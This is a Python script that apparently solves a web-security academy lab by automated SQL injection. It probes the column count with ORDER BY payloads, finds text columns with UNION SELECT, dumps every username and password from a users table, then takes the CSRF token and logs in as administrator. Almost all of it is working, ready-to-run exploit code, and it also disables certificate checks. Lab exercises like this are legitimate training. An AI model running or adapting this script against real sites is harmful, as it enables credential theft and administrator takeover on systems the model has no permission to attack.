#!/usr/bin/env python3
import sys
import warnings
from typing import Dict, List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException

# Configurations
FILTER_ENDPOINT = "filter"
LOGIN_ENDPOINT = "login"
REQUEST_TIMEOUT = (2, 5)
MAX_COL_TO_TEST = 10
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


warnings.filterwarnings("ignore", message="Unverified HTTPS request")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.category = "Gifts"

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Helper to handle all HTTP communication"""
        taget_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                taget_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException as e:
            print(f"[-] Connection error: {e}")
            sys.exit(1)

    def validated_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
        stage: str = "unknown",
    ) -> Response:
        """send_request wrapper gracefully exits during unexpected error"""
        res = self.send_request(endpoint, params, data, method)
        if res is None:
            print(f"[-] Stage [{stage}]: Connection error")
            sys.exit(1)
        elif res.status_code != 200:
            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}!")
            print(f"[*] Failed payload context: {params or data}")
            sys.exit(1)
        return res

    def check_alive(self) -> bool:
        """Checks if the lab URL is still alive"""
        print("[*] Phase 1: Checking if URL is alive...")
        res = self.validated_request("")
        return "academyLabBanner" in res.text

    def harvest_category(self) -> Optional[str]:
        """Harvests catgories dynamically"""
        print("[*] Phase 2: Harvesting categories...")
        res = self.validated_request("")
        categories = []
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all("a", class_="filter-category"):
            tag_name = tag.get_text(strip=True)
            if "All" not in tag_name:
                categories.append(tag_name)
        return min(categories, key=len) if categories else None

    def find_column_count(self) -> int:
        """Identifies conlumn count"""
        print("[*] Phase 3: Identifying table width...")
        for i in range(1, 11):
            payload = f"{self.category}' ORDER BY {i} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return i - 1
        return 0

    def find_string_column(self, col_count: int) -> List[int]:
        """Determines string-compatible column"""
        print("[*] Phase 4: Determining string-compatible column...")
        marker = "asif"
        col_indices = []
        for col_idx in range(col_count):
            cols = ["NULL"] * col_count
            cols[col_idx] = f"'{marker}'"
            payload = f"{self.category}' UNION SELECT {','.join(cols)} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and res.status_code == 200:
                col_indices.append(col_idx)
        return col_indices

    def extract_n_print_creds(self, html_content: str) -> Dict[str, str]:
        """Extracts and prints user credentials from response"""
        soup = BeautifulSoup(html_content, "html.parser")
        creds = {}
        print("\n" + "-" * 50)
        print(f"{'Username':<25} | {'Password':<25}")
        print("-" * 50)
        for th in soup.find_all("th"):
            td = th.find_next_sibling("td")
            username = th.get_text(strip=True)
            password = td.get_text(strip=True) if td else ""
            if username and password and " " not in username:
                creds[username] = password
                print(f"{username:<25} | {password:<25}")

        print("-" * 50)
        return creds

    def dump_n_extract_users_table(
        self, col_count: int, col_indices: List[int]
    ) -> Optional[str]:
        """Dumps users table, prints all credentials with helper, returns administrator password"""
        print("[*] Phase 5: Extracting user credentials...")
        u_idx = col_indices[0]
        p_idx = col_indices[1]
        null_chain = ["NULL"] * col_count
        null_chain[u_idx] = "username"
        null_chain[p_idx] = "password"
        payload = f"{self.category}' UNION SELECT {','.join(null_chain)} FROM users -- "
        res = self.send_request("filter", params={"category": payload})
        if res is not None and res.status_code == 200:
            all_creds = self.extract_n_print_creds(res.text)
            return all_creds.get("administrator")
        return None

    def extract_csrf_token(self) -> Optional[str]:
        """Extract CSRF token from login page"""
        print("[*] Phase 6: Extracting CSRF token...")
        res = self.validated_request("login")
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        return (
            str(csrf_tag.get("value")) if csrf_tag and csrf_tag.get("value") else None
        )

    def verify_solved(self):
        """Checks if the lab is sovled"""
        res = self.send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Check Lab url
        if not self.check_alive():
            print("[-] Lab url has expired or invlaid!")
            return

        # Harvest categories
        categorty = self.harvest_category()
        if not categorty:
            print("[-] Could not find valid category!")
            return
        self.category = categorty
        print(f"[+] Anchor category: {categorty}")

        # Find column count
        col_count = self.find_column_count()
        if col_count == 0:
            print("[-] Could not identify column count!")
            return
        print(f"[+] Identified column count: {col_count}")

        # Determine string-compatible columns
        col_indices = self.find_string_column(col_count)
        if not col_indices:
            print("[-] Could determine string-compatible column!")
            return
        print(f"[+] Identified string-compatible: {col_indices}")

        # Extract admin password
        admin_pass = self.dump_n_extract_users_table(col_count, col_indices)
        if not admin_pass:
            print("[-] Could not extract administrator password!")

        # Extract the CSRF token
        csrf_token = self.extract_csrf_token()
        if not csrf_token:
            print("[-] Could not find CSRF token in login page!")
            return
        print(f"[+] Extracted CSRF token: {csrf_token}")

        # Login
        print("[*] Phase 7: Logging in to administrator accont...")
        login_data = {
            "csrf": csrf_token,
            "username": "administrator",
            "password": admin_pass,
        }
        self.validated_request("login", data=login_data, method="POST")

        # validate login
        if self.verify_solved():
            print("[!] SUCCESS: Lab Solved")
        else:
            print("[-] Lab is not solved!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip("/")

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
